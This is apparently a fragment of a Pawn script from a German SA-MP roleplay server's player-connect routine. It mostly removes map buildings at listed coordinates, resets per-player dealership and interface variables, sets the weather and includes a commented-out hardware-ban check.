RemoveBuildingForPlayer(playerid, 1231, 2801.9219, 933.8281, 12.7109, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 2812.2266, 933.8281, 12.7109, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 2823.4609, 933.8281, 12.7109, 0.25);
RemoveBuildingForPlayer(playerid, 3458, 2818.4609, 938.7188, 11.2422, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 2834.5078, 933.8281, 12.7109, 0.25);
RemoveBuildingForPlayer(playerid, 1365, 2849.5391, 945.0156, 10.7813, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2858.2734, 944.9766, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1343, 2863.4688, 946.0156, 10.4844, 0.25);
RemoveBuildingForPlayer(playerid, 1344, 2879.6484, 945.9688, 10.5391, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2889.7266, 943.2656, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2782.6641, 986.6719, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1358, 2796.8438, 977.6953, 10.8047, 0.25);
RemoveBuildingForPlayer(playerid, 1365, 2796.6016, 984.8203, 10.7813, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2796.5469, 996.7578, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2796.5469, 1000.3516, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2806.2109, 1017.9375, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 8546, 2814.3438, 993.8438, 13.1406, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2844.0000, 967.4063, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2844.0000, 964.7422, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2846.4688, 986.8516, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1219, 2846.4688, 980.0391, 9.9766, 0.25);
RemoveBuildingForPlayer(playerid, 8545, 2867.9766, 976.5078, 14.7422, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2866.0313, 1017.9375, 23.9297, 0.25);
RemoveBuildingForPlayer(playerid, 1278, 2889.7266, 986.6719, 23.9297, 0.25);
// SWAT


/*
for(new i=0; i<3; i++)
	{
	   TextDrawShowForPlayer(playerid,TextDraw_EventZeit[i]);
	}*/





























RemoveBuildingForPlayer(playerid, 13271, 2476.4219, 41.6875, 25.3984, 0.25);
RemoveBuildingForPlayer(playerid, 3321, 2442.0859, 65.1172, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 3318, 2415.7266, 65.1172, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 3323, 2511.4297, 89.1953, 28.3359, 0.25);
RemoveBuildingForPlayer(playerid, 3324, 2416.4219, -5.8047, 28.4219, 0.25);
RemoveBuildingForPlayer(playerid, 3325, 2441.4219, -5.8203, 27.5234, 0.25);
RemoveBuildingForPlayer(playerid, 3324, 2486.4219, 64.1953, 28.4219, 0.25);
RemoveBuildingForPlayer(playerid, 3325, 2486.4297, 89.1953, 27.5234, 0.25);
RemoveBuildingForPlayer(playerid, 3322, 2511.4375, 64.1875, 28.4219, 0.25);
RemoveBuildingForPlayer(playerid, 3323, 2416.4219, 19.1953, 28.3359, 0.25);
RemoveBuildingForPlayer(playerid, 3321, 2487.0859, 15.1172, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 3324, 2441.4297, 19.1797, 28.4219, 0.25);
RemoveBuildingForPlayer(playerid, 13461, 2373.2344, 29.1719, 30.3438, 0.25);
RemoveBuildingForPlayer(playerid, 3319, 2440.4922, 93.4922, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 3319, 2510.7266, 15.1172, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 780, 2409.5391, 15.4609, 25.4609, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2404.0156, 21.8281, 26.7188, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2404.0156, 27.1250, 26.7188, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2404.0156, 6.6641, 26.7188, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2406.7344, 6.6641, 26.7188, 0.25);
RemoveBuildingForPlayer(playerid, 3407, 2404.0703, 16.9766, 25.4453, 0.25);
RemoveBuildingForPlayer(playerid, 673, 2426.5156, 19.2188, 25.0781, 0.25);
RemoveBuildingForPlayer(playerid, 1308, 2418.2969, 31.8750, 25.6797, 0.25);
RemoveBuildingForPlayer(playerid, 769, 2426.2266, 9.6563, 24.7656, 0.25);
RemoveBuildingForPlayer(playerid, 3313, 2416.4219, 19.1953, 28.3359, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2412.0547, 6.6641, 26.7188, 0.25);
RemoveBuildingForPlayer(playerid, 673, 2447.3047, 25.2734, 25.0781, 0.25);
RemoveBuildingForPlayer(playerid, 766, 2434.9844, 3.5078, 24.9922, 0.25);
RemoveBuildingForPlayer(playerid, 3312, 2441.4297, 19.1797, 28.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2455.0391, 32.7813, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1308, 2454.1484, 6.6250, 25.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2453.8203, 17.7500, 26.7188, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2453.8203, 23.0469, 26.7188, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2451.2266, 14.9688, 26.7422, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2451.2344, 26.1875, 26.8047, 0.25);
RemoveBuildingForPlayer(playerid, 3408, 2453.7813, 28.1172, 25.4219, 0.25);
RemoveBuildingForPlayer(playerid, 12817, 2476.4219, 41.6875, 25.3984, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2472.8125, 0.6016, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1351, 2469.3516, 31.4609, 25.4375, 0.25);
RemoveBuildingForPlayer(playerid, 1308, 2473.7891, 31.7813, 25.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2482.3438, 1.8594, 26.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2476.8125, 1.8594, 26.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2498.9531, 33.2813, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1308, 2499.3594, 1.4844, 25.6797, 0.25);
RemoveBuildingForPlayer(playerid, 727, 2482.9219, 25.9766, 26.2891, 0.25);
RemoveBuildingForPlayer(playerid, 3307, 2487.0859, 15.1172, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2487.8750, 1.8594, 26.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2402.8906, 50.7344, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 781, 2405.0625, 57.5391, 26.1172, 0.25);
RemoveBuildingForPlayer(playerid, 764, 2431.3984, 56.2422, 24.8047, 0.25);
RemoveBuildingForPlayer(playerid, 13375, 2436.8594, 63.8047, 32.8203, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2431.7109, 51.8125, 26.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2437.2656, 51.8125, 26.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2429.0469, 54.6641, 26.3281, 0.25);
RemoveBuildingForPlayer(playerid, 3407, 2416.0625, 52.1641, 25.5313, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2426.1797, 51.8125, 26.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2420.6484, 51.8125, 26.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1351, 2458.6797, 51.9063, 25.4375, 0.25);
RemoveBuildingForPlayer(playerid, 1308, 2454.0781, 51.4688, 25.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2442.8125, 51.8125, 26.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2445.7500, 54.4609, 26.4297, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2453.7578, 57.0078, 26.8203, 0.25);
RemoveBuildingForPlayer(playerid, 3408, 2453.5156, 52.0313, 25.5156, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2472.8203, 50.6172, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1308, 2499.1953, 51.4766, 25.6797, 0.25);
RemoveBuildingForPlayer(playerid, 781, 2494.0391, 53.8359, 25.3984, 0.25);
RemoveBuildingForPlayer(playerid, 765, 2475.0859, 59.4453, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 3312, 2486.4219, 64.1953, 28.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2474.0781, 59.5469, 26.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2476.4297, 57.0234, 26.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2481.1641, 57.0234, 26.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2491.6094, 57.0234, 26.2266, 0.25);
RemoveBuildingForPlayer(playerid, 3309, 2415.7266, 65.1172, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1308, 2473.8438, 74.4609, 25.6797, 0.25);
RemoveBuildingForPlayer(playerid, 764, 2497.0938, 71.9766, 25.1406, 0.25);
RemoveBuildingForPlayer(playerid, 780, 2448.9844, 77.3828, 26.4063, 0.25);
RemoveBuildingForPlayer(playerid, 3307, 2442.0859, 65.1172, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2474.0781, 67.0000, 26.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2455.5234, 81.4922, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 766, 2494.1719, 79.7422, 24.9297, 0.25);
RemoveBuildingForPlayer(playerid, 764, 2503.7656, 80.1484, 23.2656, 0.25);
RemoveBuildingForPlayer(playerid, 1408, 2474.1797, 80.0781, 26.9844, 0.25);
RemoveBuildingForPlayer(playerid, 3310, 2486.4297, 89.1953, 27.5234, 0.25);
RemoveBuildingForPlayer(playerid, 3308, 2440.4922, 93.4922, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 3308, 2510.7266, 15.1172, 26.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2525.0313, 50.5625, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 779, 2523.5391, 65.0938, 25.4297, 0.25);
RemoveBuildingForPlayer(playerid, 3311, 2511.4375, 64.1875, 28.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2523.8125, 57.6406, 26.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2523.8125, 62.3516, 26.2734, 0.25);
RemoveBuildingForPlayer(playerid, 3313, 2511.4297, 89.1953, 28.3359, 0.25);
RemoveBuildingForPlayer(playerid, 766, 2429.6250, 99.9688, 26.2734, 0.25);
RemoveBuildingForPlayer(playerid, 779, 2450.1719, 101.4375, 25.0547, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2453.7891, 99.5469, 26.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1446, 2453.7891, 104.2813, 26.2734, 0.25);
RemoveBuildingForPlayer(playerid, 779, 2422.6172, -15.5938, 25.5391, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2455.0156, -19.4688, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1308, 2473.9063, -18.2109, 25.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1294, 2498.9297, -16.7344, 29.8125, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2404.0156, -10.5078, 26.7188, 0.25);
RemoveBuildingForPlayer(playerid, 3408, 2404.1016, -14.8359, 25.4219, 0.25);
RemoveBuildingForPlayer(playerid, 3310, 2441.4219, -5.8203, 27.5234, 0.25);
RemoveBuildingForPlayer(playerid, 3312, 2416.4219, -5.8047, 28.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1468, 2404.0156, -5.2109, 26.7188, 0.25);



//	WBB_GetUserID(GetName(playerid), playerid, 1);


/*
	new zSerial[128], serialfile[128], info[128];
	gpci(playerid, zSerial, 128);
	format(serialfile,128,"/hardwarebans/%s.ini",zSerial);




	if(dini_Exists(serialfile))
	{
	format(info,128,"%s wurde vom Server gekickt, Grund: Hardware-Ban",GetName(playerid));
	SendClientMessageToAll(COLOR_RED, info);
    SetTimerEx("kicktimerfake", 100,false,"i",playerid);
	}
	else
	{

	}
*/
/*
RemoveBuildingForPlayer(playerid, 7995, 1784.6797, 721.8359, 12.3359, 0.25);
RemoveBuildingForPlayer(playerid, 8027, 1797.3984, 903.1953, 8.5000, 0.25);
RemoveBuildingForPlayer(playerid, 8028, 1735.8594, 519.1563, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 8029, 1784.6797, 721.8359, 12.3359, 0.25);
RemoveBuildingForPlayer(playerid, 8055, 1797.3984, 903.1953, 8.5000, 0.25);
RemoveBuildingForPlayer(playerid, 8056, 1735.8594, 519.1563, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 8128, 1735.8750, 519.0078, 4.3594, 0.25);
RemoveBuildingForPlayer(playerid, 8129, 1735.8750, 519.0078, 4.3594, 0.25);
RemoveBuildingForPlayer(playerid, 8380, 1785.1641, 723.3672, 14.9609, 0.25);
RemoveBuildingForPlayer(playerid, 8381, 1785.1641, 723.3672, 14.9609, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1716.7813, 460.8906, 35.9688, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1750.1094, 556.5469, 31.0391, 0.25);
RemoveBuildingForPlayer(playerid, 763, 1766.6250, 737.6250, 9.5625, 0.25);
RemoveBuildingForPlayer(playerid, 654, 1767.0391, 759.5938, 8.8984, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1777.5938, 653.3594, 23.2500, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1796.3516, 789.2344, 16.6719, 0.25);
RemoveBuildingForPlayer(playerid, 3516, 1811.7422, 822.9297, 12.9219, 0.25);
RemoveBuildingForPlayer(playerid, 13350, 1663.8125, 282.8672, 31.7578, 0.25);
RemoveBuildingForPlayer(playerid, 13356, 1670.1172, 313.3594, 24.7422, 0.25);
RemoveBuildingForPlayer(playerid, 3336, 1642.2188, 157.1641, 33.2422, 0.25);
RemoveBuildingForPlayer(playerid, 12829, 1663.8125, 282.8672, 31.7578, 0.25);
RemoveBuildingForPlayer(playerid, 3336, 1648.5313, 304.1328, 29.5234, 0.25);
RemoveBuildingForPlayer(playerid, 13347, 1670.1172, 313.3594, 24.7422, 0.25);
RemoveBuildingForPlayer(playerid, 13519, 1621.3047, 339.3359, -1.2891, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1690.1719, 383.3125, 35.4297, 0.25);

*/

	if(PlayerInfo[playerid][pWeather] == 0)
	{
		SetPlayerWeather(playerid,12);
	}
	if(PlayerInfo[playerid][pWeather] == 1)
	{
			SetPlayerWeather(playerid,-77);
	}

/*
// LV NEU

RemoveBuildingForPlayer(playerid, 10822, -1336.8125, 892.7578, 57.9141, 0.25);
RemoveBuildingForPlayer(playerid, 10823, -1204.1172, 1032.6094, 53.5703, 0.25);
RemoveBuildingForPlayer(playerid, 11248, -1204.1172, 1032.6094, 53.5703, 0.25);
RemoveBuildingForPlayer(playerid, 11251, -1336.8125, 892.7578, 57.9141, 0.25);
RemoveBuildingForPlayer(playerid, 11381, -1349.3281, 879.4219, 43.0313, 0.25);
RemoveBuildingForPlayer(playerid, 11382, -1200.7500, 1035.9844, 38.4141, 0.25);
RemoveBuildingForPlayer(playerid, 1290, -1188.8359, 1046.7891, 46.6719, 0.25);
RemoveBuildingForPlayer(playerid, 9687, -2681.4922, 1684.4609, 120.4531, 0.25);
RemoveBuildingForPlayer(playerid, 9689, -2681.4922, 1684.4609, 120.4531, 0.25);
RemoveBuildingForPlayer(playerid, 9691, -2681.4922, 1847.9375, 120.0859, 0.25);
RemoveBuildingForPlayer(playerid, 9693, -2681.4922, 1847.9375, 120.0859, 0.25);
RemoveBuildingForPlayer(playerid, 8028, 1735.8594, 519.1563, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 8056, 1735.8594, 519.1563, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 8128, 1735.8750, 519.0078, 4.3594, 0.25);
RemoveBuildingForPlayer(playerid, 8129, 1735.8750, 519.0078, 4.3594, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 537.1953, 434.4063, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 445.4219, 565.4688, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3333, -178.7188, 326.5391, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3333, -158.3516, 403.9063, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3333, 521.1172, 471.7891, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3333, 475.2344, 537.3203, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 491.3125, 499.9375, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16431, 475.1250, 537.4375, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 16432, 566.8984, 406.3750, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -176.3516, 367.5234, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -196.7891, 290.1797, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -155.9844, 444.8906, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 16688, -168.3203, 367.2422, 10.6641, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -196.7891, 290.1797, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3330, -178.7188, 326.5391, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -176.3516, 367.5234, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 16358, -168.3203, 367.2422, 10.6641, 0.25);
RemoveBuildingForPlayer(playerid, 3330, -158.3516, 403.9063, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -155.9844, 444.8906, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 445.4219, 565.4688, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16357, 475.1250, 537.4375, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 3330, 475.2344, 537.3203, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 491.3125, 499.9375, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3330, 521.1172, 471.7891, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 537.1953, 434.4063, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16430, 566.8984, 406.3750, 17.5859, 0.25);

//
RemoveBuildingForPlayer(playerid, 10822, -1336.8125, 892.7578, 57.9141, 0.25);
RemoveBuildingForPlayer(playerid, 10823, -1204.1172, 1032.6094, 53.5703, 0.25);
RemoveBuildingForPlayer(playerid, 11248, -1204.1172, 1032.6094, 53.5703, 0.25);
RemoveBuildingForPlayer(playerid, 11251, -1336.8125, 892.7578, 57.9141, 0.25);
RemoveBuildingForPlayer(playerid, 11381, -1349.3281, 879.4219, 43.0313, 0.25);
RemoveBuildingForPlayer(playerid, 11382, -1200.7500, 1035.9844, 38.4141, 0.25);
RemoveBuildingForPlayer(playerid, 1290, -1188.8359, 1046.7891, 46.6719, 0.25);
RemoveBuildingForPlayer(playerid, 9687, -2681.4922, 1684.4609, 120.4531, 0.25);
RemoveBuildingForPlayer(playerid, 9689, -2681.4922, 1684.4609, 120.4531, 0.25);
RemoveBuildingForPlayer(playerid, 9691, -2681.4922, 1847.9375, 120.0859, 0.25);
RemoveBuildingForPlayer(playerid, 9693, -2681.4922, 1847.9375, 120.0859, 0.25);
RemoveBuildingForPlayer(playerid, 8028, 1735.8594, 519.1563, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 8056, 1735.8594, 519.1563, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 8128, 1735.8750, 519.0078, 4.3594, 0.25);
RemoveBuildingForPlayer(playerid, 8129, 1735.8750, 519.0078, 4.3594, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1716.7813, 460.8906, 35.9688, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1750.1094, 556.5469, 31.0391, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 537.1953, 434.4063, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 445.4219, 565.4688, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3333, -178.7188, 326.5391, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3333, -158.3516, 403.9063, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3333, 521.1172, 471.7891, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3333, 475.2344, 537.3203, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 491.3125, 499.9375, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16431, 475.1250, 537.4375, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 16432, 566.8984, 406.3750, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -176.3516, 367.5234, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -196.7891, 290.1797, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -155.9844, 444.8906, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 16688, -168.3203, 367.2422, 10.6641, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -196.7891, 290.1797, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3330, -178.7188, 326.5391, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -176.3516, 367.5234, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 16358, -168.3203, 367.2422, 10.6641, 0.25);
RemoveBuildingForPlayer(playerid, 3330, -158.3516, 403.9063, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -155.9844, 444.8906, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 445.4219, 565.4688, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16357, 475.1250, 537.4375, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 3330, 475.2344, 537.3203, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 491.3125, 499.9375, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3330, 521.1172, 471.7891, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 537.1953, 434.4063, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16430, 566.8984, 406.3750, 17.5859, 0.25);
*/
/*
RemoveBuildingForPlayer(playerid, 10822, -1336.8125, 892.7578, 57.9141, 0.25);
RemoveBuildingForPlayer(playerid, 10823, -1204.1172, 1032.6094, 53.5703, 0.25);
RemoveBuildingForPlayer(playerid, 11248, -1204.1172, 1032.6094, 53.5703, 0.25);
RemoveBuildingForPlayer(playerid, 11251, -1336.8125, 892.7578, 57.9141, 0.25);
RemoveBuildingForPlayer(playerid, 11381, -1349.3281, 879.4219, 43.0313, 0.25);
RemoveBuildingForPlayer(playerid, 11382, -1200.7500, 1035.9844, 38.4141, 0.25);
RemoveBuildingForPlayer(playerid, 1290, -1188.8359, 1046.7891, 46.6719, 0.25);
RemoveBuildingForPlayer(playerid, 9687, -2681.4922, 1684.4609, 120.4531, 0.25);
RemoveBuildingForPlayer(playerid, 9689, -2681.4922, 1684.4609, 120.4531, 0.25);
RemoveBuildingForPlayer(playerid, 9691, -2681.4922, 1847.9375, 120.0859, 0.25);
RemoveBuildingForPlayer(playerid, 9693, -2681.4922, 1847.9375, 120.0859, 0.25);
RemoveBuildingForPlayer(playerid, 8028, 1735.8594, 519.1563, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 8056, 1735.8594, 519.1563, 25.1563, 0.25);
RemoveBuildingForPlayer(playerid, 8128, 1735.8750, 519.0078, 4.3594, 0.25);
RemoveBuildingForPlayer(playerid, 8129, 1735.8750, 519.0078, 4.3594, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1716.7813, 460.8906, 35.9688, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1750.1094, 556.5469, 31.0391, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 537.1953, 434.4063, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 445.4219, 565.4688, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3333, -178.7188, 326.5391, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3333, -158.3516, 403.9063, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3333, 521.1172, 471.7891, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3333, 475.2344, 537.3203, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3332, 491.3125, 499.9375, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16431, 475.1250, 537.4375, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 16432, 566.8984, 406.3750, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -176.3516, 367.5234, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -196.7891, 290.1797, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3382, -155.9844, 444.8906, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 16688, -168.3203, 367.2422, 10.6641, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -196.7891, 290.1797, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3330, -178.7188, 326.5391, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -176.3516, 367.5234, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 16358, -168.3203, 367.2422, 10.6641, 0.25);
RemoveBuildingForPlayer(playerid, 3330, -158.3516, 403.9063, -3.5391, 0.25);
RemoveBuildingForPlayer(playerid, 3381, -155.9844, 444.8906, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 445.4219, 565.4688, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16357, 475.1250, 537.4375, 17.5859, 0.25);
RemoveBuildingForPlayer(playerid, 3330, 475.2344, 537.3203, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 491.3125, 499.9375, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 3330, 521.1172, 471.7891, 3.3203, 0.25);
RemoveBuildingForPlayer(playerid, 3331, 537.1953, 434.4063, 24.5547, 0.25);
RemoveBuildingForPlayer(playerid, 16430, 566.8984, 406.3750, 17.5859, 0.25);


*/







RemoveBuildingForPlayer(playerid, 1411, 347.1953, 1799.2656, 18.7578, 0.25);
RemoveBuildingForPlayer(playerid, 1411, 342.9375, 1796.2891, 18.7578, 0.25);
// IFROST







	RemoveBuildingForPlayer(playerid, 785, -102.5313, -2556.8516, 38.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 17445, -11.2734, -2498.9766, 35.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 17447, -10.1719, -2526.5859, 37.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 17042, -24.3203, -2528.1641, 35.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 17070, -23.3750, -2507.1250, 35.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 17044, -11.2734, -2498.9766, 35.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 17045, -10.1719, -2526.5859, 37.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 726, 3.7578, -2532.1250, 35.9922, 0.25);



/*
	for (new i = 0; i < MAX_SYNC_TYPES; ++i)
	    SetSyncTime (playerid, i);

*/
//-----------------------------Autohaus----------------------------------------------------------
	dtc_AutohausCar[playerid] = 0;
    dtc_AutohausCat[playerid] = 2000;
    dtc_AutohausSCar[playerid] = 0;
    Dtc_PlayerKey[playerid] = 0;
    for(new i = 0; i < MaxVeh; i++)
	{
    	Dtc_PlayerHaveCar[playerid][i] = 0;
	}
	OnPlayerCarLogin(playerid);
//------------------------------------------------------------------------------------------------

    DialogShowed[playerid] = 0;

    VehVerkauf[playerid] = 0;

    Desktop_Check[playerid] = 0;
    Desktop_Timer_Started[playerid] = 0;

    GutscheinResultPlayer[playerid] = 0;



    GutscheinResult[playerid] = 0;

    Desktop_Status[playerid] = 0;
    KeyStatus[playerid] = 0;

// TEXTDRAW BUG


	// O Amt Neu
	RemoveBuildingForPlayer(playerid, 3777, 831.9609, -1191.1406, 25.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 3777, 868.1328, -1191.1406, 25.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 5978, 887.9844, -1287.1328, 18.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 6005, 895.2578, -1256.9297, 31.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 3776, 831.9609, -1191.1406, 25.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 5706, 887.9844, -1287.1328, 18.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 3776, 868.1328, -1191.1406, 25.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 5838, 895.2578, -1256.9297, 31.2344, 0.25);



/*
	// Oamt Scheisse
	RemoveBuildingForPlayer(playerid, 5978, 887.9844, -1287.1328, 18.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 5706, 887.9844, -1287.1328, 18.2656, 0.25);
*/

	GameTextForPlayer(playerid, "~w~Die Welt wird aufgebaut", 3300, 3);

	//
